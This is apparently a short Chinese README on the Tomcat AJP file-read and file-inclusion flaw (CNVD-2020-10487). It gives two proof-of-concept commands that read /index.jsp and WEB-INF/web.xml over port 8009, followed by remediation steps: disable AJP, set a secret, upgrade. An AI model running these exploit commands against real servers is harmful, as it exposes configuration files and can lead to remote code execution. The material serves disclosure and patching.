# Tomcat被曝出文件包含漏洞或导致RCE  

2020.02.21-CNVD-2020-10487-Tomcat-Ajp-lfi  

现在有两个poc     
## poc1  
1.参考链接（https://github.com/0nise/CVE-2020-1938）  
任意文件读取  
`java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 file /index.jsp`  
文件包含  
```java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 jsp /index.jsp```  
截图如下  
![漏洞截图](https://github.com/bmjoker/poc/blob/master/Tomcat/1.png)    
  
## poc2  
2.参考链接（https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi）  
任意文件读取
```py -2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml```  
![漏洞截图](https://github.com/bmjoker/poc/blob/master/Tomcat/2.png)  
# 漏洞修复：  
* 临时禁用AJP协议端口，在conf/server.xm l配置文件中注释掉<Connector port="8009" protocol="AJP/1.3"redirectPort="8443" />  
* 配置ajp配置中的secretRequired跟secret属性来限制认证  
* 官方下载最新版下载地址：  
https://tomcat.apache.org/download-70.cgi  
https://tomcat.apache.org/download-80.cgi  
https://tomcat.apache.org/download-90.cgi  
https://github.com/apache/tomcat/releases  



